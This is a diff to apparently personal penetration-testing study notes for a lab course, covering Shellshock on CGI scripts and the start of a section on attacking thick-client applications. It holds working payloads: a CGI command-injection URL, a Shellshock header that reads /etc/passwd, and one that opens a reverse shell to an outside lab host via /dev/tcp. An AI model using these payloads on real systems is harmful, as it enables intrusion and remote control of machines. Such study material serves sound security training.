@@ -493,3 +493,32 @@ http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.e
 ```bash
 env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
 ```
+* Bash will interpret the `y='() { :;};'` portion as a function definition for a variable `y`
+* If the system is not vulnerable, only `"not vulnerable"` will be printed
+* Hunting for CGI scripts:
+```bash
+gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+```
+* confirming vuln:
+```bash
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
+```
+* Reverse shell ex:
+```bash
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+```
+
+# Attacking Thick Client Applications
+* Thick client applications are the applications that are installed locally on our computers
+* these applications do not require internet access to run, and they perform better in processing power, memory, and storage capacity
+* These applications are usually developed using Java, C++, .NET, or Microsoft Silverlight
+![](Attacking%20Common%20Applications-paste-1.png)
+* Information Gathering
+	* tools:
+		* CFF Explorer
+		* Detect It Easy
+		* Process Monitor
+		* Strings
+* Client side attacks
+* Network side attacks
+* Server side a
